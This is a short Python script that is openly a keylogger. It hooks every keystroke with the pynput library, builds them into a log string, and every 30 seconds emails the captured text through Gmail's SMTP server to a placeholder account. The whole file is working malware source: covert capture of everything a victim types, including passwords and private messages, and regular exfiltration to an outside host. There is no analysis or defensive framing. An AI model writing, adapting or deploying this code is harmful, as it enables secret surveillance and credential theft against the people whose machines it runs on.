import pynput.keyboard
import smtplib

import threading
#from pynput import keyboard
log=" "

def callback_listener(key):
    global log
    try:
        log=log+key.char
    except AttributeError:
        if key==key.space:
            log=log+ " "
        else:
            log=log+str(key)
    except:
        pass
    print(log)

def send_email(email,password,massage):
    email_server=smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,massage)
    #from username1@gmail.com to username2@gmail.com
    email_server.quit()


keylogger_listener=pynput.keyboard.Listener(on_press=callback_listener)

def theread_function():
    global log
    send_email("username@gmail.com","password",log.encode('utf-8'))
    log=" "
    timer_object=threading.Timer(30,theread_function)
    timer_object.start()

#threading
with keylogger_listener:
    theread_function()
    keylogger_listener.join()